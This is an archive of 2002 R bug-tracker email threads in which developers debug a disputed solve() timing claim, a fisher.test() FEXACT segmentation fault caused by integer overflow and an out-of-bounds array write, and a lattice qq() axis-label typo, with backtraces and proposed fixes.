Message-ID: <Pine.WNT.4.44.0203052125210.1136-100000@tern.stats>
Sender: ripley@stats.ox.ac.uk
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

On Tue, 5 Mar 2002 hyu@stats.uwo.ca wrote:

> Full_Name: Hao Yu
> Version: 1.4.1
> OS: Windws and Linux
> Submission from: (NULL) (129.100.45.161)

[...]

> the result was (PIII Xeon 1GHz RedHat 7.2 Linux))
> > system.time(solve.Matrix(Toeplitz(.5^seq(0,999))))
> [1] 9.76 0.22 9.97 0.00 0.00
>
> Clearly there are some bugs in solve() and solve.Matrix(). Notice that all have

Nothing in this report suggests a bug in solve().  Can you please provide
some evidence for your claim (which is not `clear' to me), and

> solve
function (a, b, ...)
UseMethod("solve")

seems hard to get wrong!  (It matters: solve is part of R: solve.Matrix is
a contributed addon.)

Incidentally, these sort of timings are crucially dependent on the BLAS
library used, and in my experience that is a far larger factor that the OS
used.  However, that was not part of the report ....

-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272860 (secr)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595


==> 1361.audit <==
Thu Mar  7 12:41:18 2002	ripley	changed notes
Thu Mar  7 12:41:18 2002	ripley	foobar
Thu Mar  7 12:41:18 2002	ripley	moved from incoming to Add-ons
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1662 *
Subject: fisher.test FEXACT memory bug "should not occur"
From: Martin Maechler <maechler@stat.math.ethz.ch>
Date: Thu, 13 Jun 2002 08:21:50 +0200
--The supplementary (table of sum one) is fixed for 1.5.1.
--Detection code for the first problem has been added to 1.5.1 which will stop
--the crash, but the underlying cause is still open.
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1662 <==
From maechler@stat.math.ethz.ch  Thu Jun 13 08:22:43 2002
Received: from stat.math.ethz.ch (daemon@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id IAA16033
	for <R-bugs@biostat.ku.dk>; Thu, 13 Jun 2002 08:22:42 +0200 (MET DST)
Received: (from daemon@localhost)
	by stat.math.ethz.ch (8.9.1/8.9.1) id IAA01485
	for <r-bugs@hypatia>; Thu, 13 Jun 2002 08:21:35 +0200 (MET DST)
Received: from lynne(129.132.58.30), claiming to be "lynne.ethz.ch"
 via SMTP by hypatia, id smtpdAAAa000Jg; Thu Jun 13 08:21:26 2002
Received: (from maechler@localhost)
	by lynne.ethz.ch (8.11.6/8.11.2) id g5D6LoC13482;
	Thu, 13 Jun 2002 08:21:50 +0200
X-Authentication-Warning: lynne.ethz.ch: maechler set sender to maechler@stat.math.ethz.ch using -f
From: Martin Maechler <maechler@stat.math.ethz.ch>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Message-ID: <15624.14846.214663.363944@gargle.gargle.HOWL>
Date: Thu, 13 Jun 2002 08:21:50 +0200
To: R-bugs@stat.math.ethz.ch
Subject: fisher.test FEXACT memory bug "should not occur"
X-Mailer: VM 7.07 under Emacs 20.7.1
Reply-To: Martin Maechler <maechler@stat.math.ethz.ch>

This is a bad bug as reported by Robin Hankin,
it is still in "R-patched" ...

##- From: Robin Hankin <r.hankin@auckland.ac.nz>
##- To: r-help@stat.math.ethz.ch
##- Subject: [R] possum sleeping: thanks and fisher.test() FEXACT error
##- Date: Thu, 13 Jun 2002 16:46:26 +1200

## .....

## Example slighlty modified (MM)

d4 <- matrix(c(0, 0, 0, 0, 0,  0, 3, 0, 1, 0,  0, 0, 0, 0, 0,
               1, 0, 0, 0, 0,  1, 0, 0, 2, 0,  0, 0, 1, 0, 0,
               0, 1, 0, 1, 0,  4, 0, 2, 0, 0,  0, 1, 0, 0, 0,  0, 0, 0, 0, 0,
               0, 1, 0, 0, 2,  0, 0, 0, 2, 2,  0, 1, 0, 0, 0,
               0, 0, 1, 1, 0,  0, 0, 0, 0, 0,  0, 1, 0, 0, 0,
               1, 0, 0, 0, 2,  0, 0, 0, 3, 0,  0, 0, 0, 0, 1,  0, 0, 0, 0, 0,
               2, 0, 0, 0, 0,  0, 0, 0, 0, 0,  0, 0, 1, 0, 1,
               0, 0, 0, 0, 2,  0, 0, 0, 0, 8,  0, 0, 0, 3, 0,
               0, 0, 0, 0, 0,  0, 0, 0, 0, 0,  0, 0, 0, 0, 0,  0, 0, 0, 0, 1,
               0, 0, 1, 0, 0,  0, 0, 0, 0, 0,  2, 0, 0, 1, 0,
               0, 2, 0, 0, 0,  0, 2, 0, 0, 1,  3, 0, 0, 0, 0,
               0, 0, 0, 0, 0,  0, 0, 0, 0, 1,  0, 0, 1, 0, 0,  4, 0, 0, 0, 0),
             nr=50)

fisher.test(d4)
##- Error in fisher.test(alldata[, 2:5]) : FEXACT error 30.
##- Stack length exceeded in f3xact.
##- This problem should not occur.


==> 1662.followup.1 <==
From ligges@amadeus.statistik.uni-dortmund.de  Thu Jun 13 08:58:58 2002
Received: from nx5.HRZ.Uni-Dortmund.DE (nx5.HRZ.Uni-Dortmund.DE [129.217.131.21])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id IAA16332
	for <R-bugs@biostat.ku.dk>; Thu, 13 Jun 2002 08:58:57 +0200 (MET DST)
Received: from amadeus.statistik.uni-dortmund.de by nx5.HRZ.Uni-Dortmund.DE
          via smtp-local with ESMTP; Thu, 13 Jun 2002 08:56:18 +0200
Received: from statistik.uni-dortmund.de ([129.217.207.201])
	by amadeus.statistik.uni-dortmund.de (8.11.6+Sun/8.11.6) with ESMTP id g5D6uH708478;
	Thu, 13 Jun 2002 08:56:18 +0200 (MET DST)
Message-ID: <3D084237.3F455ED2@statistik.uni-dortmund.de>
Date: Thu, 13 Jun 2002 08:56:55 +0200
From: Uwe Ligges <ligges@statistik.uni-dortmund.de>
Organization: Fachbereich Statistik, Universitaet Dortmund
X-Mailer: Mozilla 4.79 [en] (WinNT; U)
X-Accept-Language: en
MIME-Version: 1.0
To: maechler@stat.math.ethz.ch
CC: R-bugs@biostat.ku.dk
Subject: Re: fisher.test FEXACT memory bug "should not occur" (PR#1662)
References: <200206130622.IAA16038@pubhealth.ku.dk>
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

maechler@stat.math.ethz.ch wrote:
> 
> This is a bad bug as reported by Robin Hankin,
> it is still in "R-patched" ...
> 
> ##- From: Robin Hankin <r.hankin@auckland.ac.nz>
> ##- To: r-help@stat.math.ethz.ch
> ##- Subject: [R] possum sleeping: thanks and fisher.test() FEXACT error
> ##- Date: Thu, 13 Jun 2002 16:46:26 +1200
> 
> ## .....
> 
> ## Example slighlty modified (MM)
> 
> d4 <- matrix(c(0, 0, 0, 0, 0,  0, 3, 0, 1, 0,  0, 0, 0, 0, 0,
>                1, 0, 0, 0, 0,  1, 0, 0, 2, 0,  0, 0, 1, 0, 0,
>                0, 1, 0, 1, 0,  4, 0, 2, 0, 0,  0, 1, 0, 0, 0,  0, 0, 0, 0, 0,
>                0, 1, 0, 0, 2,  0, 0, 0, 2, 2,  0, 1, 0, 0, 0,
>                0, 0, 1, 1, 0,  0, 0, 0, 0, 0,  0, 1, 0, 0, 0,
>                1, 0, 0, 0, 2,  0, 0, 0, 3, 0,  0, 0, 0, 0, 1,  0, 0, 0, 0, 0,
>                2, 0, 0, 0, 0,  0, 0, 0, 0, 0,  0, 0, 1, 0, 1,
>                0, 0, 0, 0, 2,  0, 0, 0, 0, 8,  0, 0, 0, 3, 0,
>                0, 0, 0, 0, 0,  0, 0, 0, 0, 0,  0, 0, 0, 0, 0,  0, 0, 0, 0, 1,
>                0, 0, 1, 0, 0,  0, 0, 0, 0, 0,  2, 0, 0, 1, 0,
>                0, 2, 0, 0, 0,  0, 2, 0, 0, 1,  3, 0, 0, 0, 0,
>                0, 0, 0, 0, 0,  0, 0, 0, 0, 1,  0, 0, 1, 0, 0,  4, 0, 0, 0, 0),
>              nr=50)
> 
> fisher.test(d4)
> ##- Error in fisher.test(alldata[, 2:5]) : FEXACT error 30.
> ##- Stack length exceeded in f3xact.
> ##- This problem should not occur.

Just for the record:
  repeat try(fisher.test(d4))
results in a crash after a few iterations (R-1.5.0 patched on WinNT
4.0).

Uwe Ligges

==> 1662.reply.1 <==
From maechler@stat.math.ethz.ch  Thu Jun 13 12:17:02 2002
Received: from stat.math.ethz.ch (daemon@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id MAA19850
	for <R-bugs@biostat.ku.dk>; Thu, 13 Jun 2002 12:17:01 +0200 (MET DST)
Received: (from daemon@localhost)
	by stat.math.ethz.ch (8.9.1/8.9.1) id MAA05039;
	Thu, 13 Jun 2002 12:15:37 +0200 (MET DST)
Received: from lynne(129.132.58.30), claiming to be "lynne.ethz.ch"
 via SMTP by hypatia, id smtpdAAAa001Eg; Thu Jun 13 12:15:28 2002
Received: (from maechler@localhost)
	by lynne.ethz.ch (8.11.6/8.11.2) id g5DAFsK19920;
	Thu, 13 Jun 2002 12:15:54 +0200
X-Authentication-Warning: lynne.ethz.ch: maechler set sender to maechler@stat.math.ethz.ch using -f
From: Martin Maechler <maechler@stat.math.ethz.ch>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Message-ID: <15624.28889.858685.234909@gargle.gargle.HOWL>
Date: Thu, 13 Jun 2002 12:15:53 +0200
To: Prof Brian D Ripley <ripley@stats.ox.ac.uk>
Cc: R-bugs@stat.math.ethz.ch, R-core@stat.math.ethz.ch
Subject: Re: bad fisher.test() bug (PR#1662)
In-Reply-To: <Pine.GSO.4.44.0206131000030.1025-100000@auk.stats>
References: <15624.23861.930057.723845@gargle.gargle.HOWL>
	<Pine.GSO.4.44.0206131000030.1025-100000@auk.stats>
X-Mailer: VM 7.07 under Emacs 20.7.1
Reply-To: Martin Maechler <maechler@stat.math.ethz.ch>

(CC'ed to R-bugs  ``for the record'')

>>>>> "BDR" == Prof Brian D Ripley <ripley@stats.ox.ac.uk> writes:

    BDR> On Thu, 13 Jun 2002, Martin Maechler wrote:
    >> >>>>> "MM" == Martin Maechler
    >> <maechler@stat.math.ethz.ch> writes:
    >> 
    >> >>>>> "BDR" == Brian D Ripley <ripley@stats.ox.ac.uk>
    >> writes:
    BDR> Martin, What makes this a `bad bug'?  Are you getting a
    BDR> seg fault?
    >>
    MM> yes, always in the half a dozen restarts I tried.
    >>  (in the mean time I had one case where it did not ..)
    >> 
    BDR> Like Uwe this works for me the first few times and I do
    BDR> then get a backtrace (in memory.c, so this is almost
    BDR> certainly an earlier overrun).
    >>
    MM> I see.  This has been different for me.
    >>
    BDR> I think we've had problems before with FEXACT
    BDR> incorrectly specifying the required sizes of its
    BDR> workspaces.
    >>  (I'm not so sure this is the problem here.)
    >> 
    >> I found that
    >> 
    >> fisher.test(d4[1:30,])
    >> 
    >> gives a direct segmentation fault (without any error
    >> message) for me.
    >> 

    BDR> I've had to compile up gdb 5.2 to get the correct
    BDR> information out of R on Linux compiled under gcc-3.1.
    BDR> That shows (on the original problem)

    BDR> Loaded symbols for
    BDR> /users/ripley/R/R-patched/library/ctest/libs/ctest.so
    BDR> #0 f3xact (nrow=0x40051074, irow=0x4005113c,
    BDR> ncol=0x40051000, icol=0x40051120, dlp=0x4041b110,
    BDR> mm=0x40050fc0, fact=0x4035f020, ico=0x4035f4dc,
    BDR> iro=0x4035f5a4, it=0x4035f66c, lb=0x4035f734,
    BDR> nr=0x4035f7fc, nt=0x4035f8c4, nu=0x4035f98c,
    BDR> itc=0x4035fa54, ist=0x40360094, stv=0x40364f18,
    BDR> alen=0x40365ba0, tol=0x4004f878) at
    BDR> /users/ripley/R/cvs/R-patched/src/library/ctest/src/fexact.c:1125
    BDR> 1125 ist[itp] = -1; (gdb) print itp $1 = -3544

    BDR> The same with your variant (except the value of itp).

Okay, I found a much smaller table  --- and a different place
for the seg.fault :
> fisher.test(cbind(0,c(0,0,1)))

Program received signal SIGSEGV, Segmentation fault.
f2xact (nrow=0x8a12ec0, ncol=0x8a12ee0, table=0x8b7bb38, ldtabl=0x8a12f00, 
    expect=0x89dad68, percnt=0x89dad90, emin=0x89dadb8, prt=0x89dade0, 
    pre=0x89dae08, fact=0x403b3020, ico=0x403b302c, iro=0x403b3038, 
    kyy=0x403b3044, idif=0x403b3050, irn=0x403b3058, key=0x403b49d4, 
    ldkey=0xbfffc398, ipoin=0x403b5d44, stp=0x403b70b0, ldstp=0xbfffc39c, 
    ifrq=0x403ffef4, dlp=0x4046d450, dsp=0x4046fb30, tm=0x40472210, 
    key2=0x404748f4, iwk=0x403b3060, rwk=0x403b3d30)
    at ../../../../../R/src/library/ctest/src/fexact.c:524
524		obs += fact[ico[j]] - dd;

Martin



==> 1662.followup.2 <==
From ripley@stats.ox.ac.uk  Thu Jun 13 13:16:27 2002
Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id NAA20855
	for <R-bugs@biostat.ku.dk>; Thu, 13 Jun 2002 13:16:27 +0200 (MET DST)
Received: from auk.stats (pc1-oxfd1-4-cust16.oxf.cable.ntl.com [62.254.131.16])
	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id MAA15227;
	Thu, 13 Jun 2002 12:15:44 +0100 (BST)
Date: Thu, 13 Jun 2002 12:14:46 +0100 (BST)
From: Prof Brian D Ripley <ripley@stats.ox.ac.uk>
Sender: ripley@auk.stats
To: maechler@stat.math.ethz.ch
cc: R-bugs@biostat.ku.dk, <r.hankin@auckland.ac.nz>
Subject: Re: fisher.test FEXACT memory bug "should not occur" (PR#1662)
In-Reply-To: <200206130622.IAA16038@pubhealth.ku.dk>
Message-ID: <Pine.GSO.4.44.0206131210510.16576-100000@auk.stats>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

This occurred because integer overflow was giving negative keys.

Append the following line at line 1083 of fexact.c

      if (ipn < 1) ipn += ldst; /* because key might be negative */


> fisher.test(d4)

      Fisher's Exact Test for Count Data

data:  d4
p-value = < 2.2e-16
alternative hypothesis: two.sided



On Thu, 13 Jun 2002 maechler@stat.math.ethz.ch wrote:

> This is a bad bug as reported by Robin Hankin,
> it is still in "R-patched" ...
>
> ##- From: Robin Hankin <r.hankin@auckland.ac.nz>
> ##- To: r-help@stat.math.ethz.ch
> ##- Subject: [R] possum sleeping: thanks and fisher.test() FEXACT error
> ##- Date: Thu, 13 Jun 2002 16:46:26 +1200
>
> ## .....
>
> ## Example slighlty modified (MM)
>
> d4 <- matrix(c(0, 0, 0, 0, 0,  0, 3, 0, 1, 0,  0, 0, 0, 0, 0,
>                1, 0, 0, 0, 0,  1, 0, 0, 2, 0,  0, 0, 1, 0, 0,
>                0, 1, 0, 1, 0,  4, 0, 2, 0, 0,  0, 1, 0, 0, 0,  0, 0, 0, 0, 0,
>                0, 1, 0, 0, 2,  0, 0, 0, 2, 2,  0, 1, 0, 0, 0,
>                0, 0, 1, 1, 0,  0, 0, 0, 0, 0,  0, 1, 0, 0, 0,
>                1, 0, 0, 0, 2,  0, 0, 0, 3, 0,  0, 0, 0, 0, 1,  0, 0, 0, 0, 0,
>                2, 0, 0, 0, 0,  0, 0, 0, 0, 0,  0, 0, 1, 0, 1,
>                0, 0, 0, 0, 2,  0, 0, 0, 0, 8,  0, 0, 0, 3, 0,
>                0, 0, 0, 0, 0,  0, 0, 0, 0, 0,  0, 0, 0, 0, 0,  0, 0, 0, 0, 1,
>                0, 0, 1, 0, 0,  0, 0, 0, 0, 0,  2, 0, 0, 1, 0,
>                0, 2, 0, 0, 0,  0, 2, 0, 0, 1,  3, 0, 0, 0, 0,
>                0, 0, 0, 0, 0,  0, 0, 0, 0, 1,  0, 0, 1, 0, 0,  4, 0, 0, 0, 0),
>              nr=50)
>
> fisher.test(d4)
> ##- Error in fisher.test(alldata[, 2:5]) : FEXACT error 30.
> ##- Stack length exceeded in f3xact.
> ##- This problem should not occur.
>
>
> -.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-
> r-devel mailing list -- Read http://www.ci.tuwien.ac.at/~hornik/R/R-FAQ.html
> Send "info", "help", or "[un]subscribe"
> (in the "body", not the subject !)  To: r-devel-request@stat.math.ethz.ch
> _._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._
>

-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272860 (secr)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595


==> 1662.followup.3 <==
From ripley@stats.ox.ac.uk  Thu Jun 13 17:57:14 2002
Received: from stat.math.ethz.ch (daemon@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id RAA24468
	for <R-bugs@biostat.ku.dk>; Thu, 13 Jun 2002 17:57:14 +0200 (MET DST)
From: ripley@stats.ox.ac.uk
Received: (from daemon@localhost)
	by stat.math.ethz.ch (8.9.1/8.9.1) id RAA20365;
	Thu, 13 Jun 2002 17:56:07 +0200 (MET DST)
Received: from toucan.stats.ox.ac.uk(163.1.20.20)
 via SMTP by hypatia, id smtpdAAAa004wF; Thu Jun 13 17:55:59 2002
Received: from gannet.stats (gannet.stats [163.1.20.127])
	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id QAA16075;
	Thu, 13 Jun 2002 16:56:21 +0100 (BST)
Date: Thu, 13 Jun 2002 16:56:20 +0100 (BST)
X-X-Sender:  <ripley@gannet.stats>
To: Martin Maechler <maechler@stat.math.ethz.ch>
cc: <R-bugs@stat.math.ethz.ch>
Subject: Re: bad fisher.test() bug (PR#1662)
In-Reply-To: <15624.28889.858685.234909@gargle.gargle.HOWL>
Message-ID: <Pine.LNX.4.31.0206131654050.2219-100000@gannet.stats>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

On Thu, 13 Jun 2002, Martin Maechler wrote:

> Okay, I found a much smaller table  --- and a different place
> for the seg.fault :
> > fisher.test(cbind(0,c(0,0,1)))


That one is easy:  You (MM) have calculated fact[2], but fact is only of
length 2 (for values 0 and 1), so ico gets overwritten.

I now suspect that my fix for the original bug is merely a fix for a
symptom, so am going to replace it by an error message.

-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272860 (secr)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595


==> 1662.audit <==
Thu Jun 13 19:15:42 2002	ripley	changed notes
Thu Jun 13 19:15:42 2002	ripley	foobar
Thu Jun 13 19:15:42 2002	ripley	moved from incoming to Add-ons
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1729 *
Subject: problem with qq( )
From: Jarno.Tuimala@Helsinki.Fi
Date: Tue, 2 Jul 2002 10:37:10 +0200 (MET DST)
--A report on lattice
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1729 <==
From Jarno.Tuimala@Helsinki.Fi  Tue Jul  2 10:37:11 2002
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id KAA28248
	for <R-bugs@biostat.ku.dk>; Tue, 2 Jul 2002 10:37:10 +0200 (MET DST)
Date: Tue, 2 Jul 2002 10:37:10 +0200 (MET DST)
From: Jarno.Tuimala@Helsinki.Fi
Message-Id: <200207020837.KAA28248@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: problem with qq( )

Full_Name: Jarno Tuimala
Version: 1.5.0
OS: Windows Nt
Submission from: (NULL) (193.166.1.21)


Running the following analysis gives as a result kukot vs. kisut.

aikaero <- -27.5+5*(0:10)
frekvenssi.m <- c(0,1,15,37,53,45,23,18,4,1,1)
frekvenssi.n <- c(2,8,12,19,33,47,42,15,2,1,0)
win.graph()
aikaero <- rep(c(aikaero,aikaero), c(frekvenssi.m,frekvenssi.n))
 a.ero <- data.frame(aikaero,
            sukupuoli=rep(c("kukot","kisut"),
                          c(sum(frekvenssi.m),sum(frekvenssi.n))))
    qq(sukupuoli ~ aikaero, data=a.ero)

However, running the following analysis, gives miehet vs. miehet.

 aikaero <- -27.5+5*(0:10)
 frekvenssi.m <- c(0,1,15,37,53,45,23,18,4,1,1)
 frekvenssi.n <- c(2,8,12,19,33,47,42,15,2,1,0)
 win.graph()
 aikaero <- rep(c(aikaero,aikaero), c(frekvenssi.m,frekvenssi.n))
 a.ero <- data.frame(aikaero,
        sukupuoli=rep(c("miehet","naiset"),
                      c(sum(frekvenssi.m),sum(frekvenssi.n))))
     qq(sukupuoli ~ aikaero, data=a.ero)

This seems to happen everytime "sukupuoli" contains one variable name, which
starts with a letter "n". If both names start with "n" or other letters the
results is miehet vs naiset as expected.

So this works fine:

a.ero <- data.frame(aikaero,
        sukupuoli=rep(c("nisset","naiset"),
                      c(sum(frekvenssi.m),sum(frekvenssi.n))))
     qq(sukupuoli ~ aikaero, data=a.ero)

And this also:

a.ero <- data.frame(aikaero,
        sukupuoli=rep(c("miehet","maiset"),
                      c(sum(frekvenssi.m),sum(frekvenssi.n))))
     qq(sukupuoli ~ aikaero, data=a.ero)

Where's the problem?
 

==> 1729.followup.1 <==
From ripley@stats.ox.ac.uk  Tue Jul  2 11:19:02 2002
Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id LAA28796
	for <R-bugs@biostat.ku.dk>; Tue, 2 Jul 2002 11:19:02 +0200 (MET DST)
From: ripley@stats.ox.ac.uk
Received: from gannet.stats (gannet.stats [163.1.20.127])
	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id KAA21799;
	Tue, 2 Jul 2002 10:18:19 +0100 (BST)
Date: Tue, 2 Jul 2002 10:18:18 +0100 (BST)
X-X-Sender:  <ripley@gannet.stats>
To: <Jarno.Tuimala@Helsinki.Fi>
cc: <r-devel@stat.math.ethz.ch>, <R-bugs@biostat.ku.dk>
Subject: Re: problem with qq( ) (PR#1729)
In-Reply-To: <200207020837.KAA28253@pubhealth.ku.dk>
Message-ID: <Pine.LNX.4.31.0207021005500.25466-100000@gannet.stats>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

1) This is a report on the lattice package, and we both need you to
mention that and to give the version number of lattice that you used
to be sure of beeing able to reproduce this.

2) It seems that the plots are actually correct, just the labels are
wrong. You can correct that by specifying xlab and ylab in the call.

3) The error appears to be a typo:

    if (missing(ylab))
        ylab <- if (is.f.y)
            unique(levels(y))[y]
        else paste("y:", as.character(unique(levels(y)[[2]])))

should be [2] for consistency.

On Tue, 2 Jul 2002 Jarno.Tuimala@Helsinki.Fi wrote:

> Full_Name: Jarno Tuimala
> Version: 1.5.0
> OS: Windows Nt
> Submission from: (NULL) (193.166.1.21)
>
>
> Running the following analysis gives as a result kukot vs. kisut.
>
> aikaero <- -27.5+5*(0:10)
> frekvenssi.m <- c(0,1,15,37,53,45,23,18,4,1,1)
> frekvenssi.n <- c(2,8,12,19,33,47,42,15,2,1,0)
> win.graph()
> aikaero <- rep(c(aikaero,aikaero), c(frekvenssi.m,frekvenssi.n))
>  a.ero <- data.frame(aikaero,
>             sukupuoli=rep(c("kukot","kisut"),
>                           c(sum(frekvenssi.m),sum(frekvenssi.n))))
>     qq(sukupuoli ~ aikaero, data=a.ero)
>
> However, running the following analysis, gives miehet vs. miehet.
>
>  aikaero <- -27.5+5*(0:10)
>  frekvenssi.m <- c(0,1,15,37,53,45,23,18,4,1,1)
>  frekvenssi.n <- c(2,8,12,19,33,47,42,15,2,1,0)
>  win.graph()
>  aikaero <- rep(c(aikaero,aikaero), c(frekvenssi.m,frekvenssi.n))
>  a.ero <- data.frame(aikaero,
>         sukupuoli=rep(c("miehet","naiset"),
>                       c(sum(frekvenssi.m),sum(frekvenssi.n))))
>      qq(sukupuoli ~ aikaero, data=a.ero)
>
> This seems to happen everytime "sukupuoli" contains one variable name, which
> starts with a letter "n". If both names start with "n" or other letters the
> results is miehet vs naiset as expected.
>
> So this works fine:
>
> a.ero <- data.frame(aikaero,
>         sukupuoli=rep(c("nisset","naiset"),
>                       c(sum(frekvenssi.m),sum(frekvenssi.n))))
>      qq(sukupuoli ~ aikaero, data=a.ero)
>
> And this also:
>
> a.ero <- data.frame(aikaero,
>         sukupuoli=rep(c("miehet","maiset"),
>                       c(sum(frekvenssi.m),sum(frekvenssi.n))))
>      qq(sukupuoli ~ aikaero, data=a.ero)
>
> Where's the problem?
>
>
> -.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-
> r-devel mailing list -- Read http://www.ci.tuwien.ac.at/~hornik/R/R-FAQ.html
> Send "info", "help", or "[un]subscribe"
> (in the "body", not the subject !)  To: r-devel-request@stat.math.ethz.ch
> _._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._
>

-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272860 (secr)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595


==> 1729.followup.2 <==
From deepayansarkar@yahoo.com  Mon Jul  8 19:44:52 2002
Received: from web13902.mail.yahoo.com (web13902.mail.yahoo.com [216.136.175.28])
	by pubhealth.ku.dk (8.9.3/8.9.1) with SMTP id TAA03638
	for <R-bugs@biostat.ku.dk>; Mon, 8 Jul 2002 19:44:51 +0200 (MET DST)
Message-ID: <20020708174408.63945.qmail@web13902.mail.yahoo.com>
Received: from [202.54.53.232] by web13902.mail.yahoo.com via HTTP; Mon, 08 Jul 2002 10:44:08 PDT
Date: Mon, 8 Jul 2002 10:44:08 -0700 (PDT)
From: Deepayan Sarkar <deepayansarkar@yahoo.com>
Subject: Re: problem with qq( ) (PR#1729)
To: R-bugs@biostat.ku.dk
In-Reply-To: <Pine.LNX.4.31.0207021005500.25466-100000@gannet.stats>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii


--- ripley@stats.ox.ac.uk wrote:
> 1) This is a report on the lattice package, and we both need you to
> mention that and to give the version number of lattice that you used
> to be sure of beeing able to reproduce this.
> 
> 2) It seems that the plots are actually correct, just the labels are
> wrong. You can correct that by specifying xlab and ylab in the call.
> 
> 3) The error appears to be a typo:
> 
>     if (missing(ylab))
>         ylab <- if (is.f.y)
>             unique(levels(y))[y]
>         else paste("y:", as.character(unique(levels(y)[[2]])))
> 
> should be [2] for consistency.


Thanks, fixed for future releases.


> On Tue, 2 Jul 2002 Jarno.Tuimala@Helsinki.Fi wrote:
> 
> > Full_Name: Jarno Tuimala
> > Version: 1.5.0
> > OS: Windows Nt
> > Submission from: (NULL) (193.166.1.21)
> >
> >
> > Running the following analysis gives as a result kukot vs. kisut.
> >
> > aikaero <- -27.5+5*(0:10)
> > frekvenssi.m <- c(0,1,15,37,53,45,23,18,4,1,1)
> > frekvenssi.n <- c(2,8,12,19,33,47,42,15,2,1,0)
> > win.graph()
> > aikaero <- rep(c(aikaero,aikaero), c(frekvenssi.m,frekvenssi.n))
> >  a.ero <- data.frame(aikaero,
> >             sukupuoli=rep(c("kukot","kisut"),
> >                           c(sum(frekvenssi.m),sum(frekvenssi.n))))
> >     qq(sukupuoli ~ aikaero, data=a.ero)
> >
> > However, running the following analysis, gives miehet vs. miehet.
> >
> >  aikaero <- -27.5+5*(0:10)
> >  frekvenssi.m <- c(0,1,15,37,53,45,23,18,4,1,1)
> >  frekvenssi.n <- c(2,8,12,19,33,47,42,15,2,1,0)
> >  win.graph()
> >  aikaero <- rep(c(aikaero,aikaero), c(frekvenssi.m,frekvenssi.n))
> >  a.ero <- data.frame(aikaero,
> >         sukupuoli=rep(c("miehet","naiset"),
> >                       c(sum(frekvenssi.m),sum(frekvenssi.n))))
> >      qq(sukupuoli ~ aikaero, data=a.ero)
> >
> > This seems to happen everytime "sukupuoli" contains one variable name,
> which
> > starts with a letter "n". If both names start with "n" or other letters the
> > results is miehet vs naiset as expected.
> >
> > So this works fine:
> >
> > a.ero <- data.frame(aikaero,
> >         sukupuoli=rep(c("nisset","naiset"),
> >                       c(sum(frekvenssi.m),sum(frekvenssi.n))))
> >      qq(sukupuoli ~ aikaero, data=a.ero)
> >
> > And this also:
> >
> > a.ero <- data.frame(aikaero,
> >         sukupuoli=rep(c("miehet","maiset"),
> >                       c(sum(frekvenssi.m),sum(frekvenssi.n))))
> >      qq(sukupuoli ~ aikaero, data=a.ero)
> >
> > Where's the problem?
> >
> >
> >
>
-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-
> > r-devel mailing list -- Read
> http://www.ci.tuwien.ac.at/~hornik/R/R-FAQ.html
> > Send "info", "help", or "[un]subscribe"
> > (in the "body", not the subject !)  To: r-devel-request@stat.math.ethz.ch
> >
>
_._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._
> >
> 
> -- 
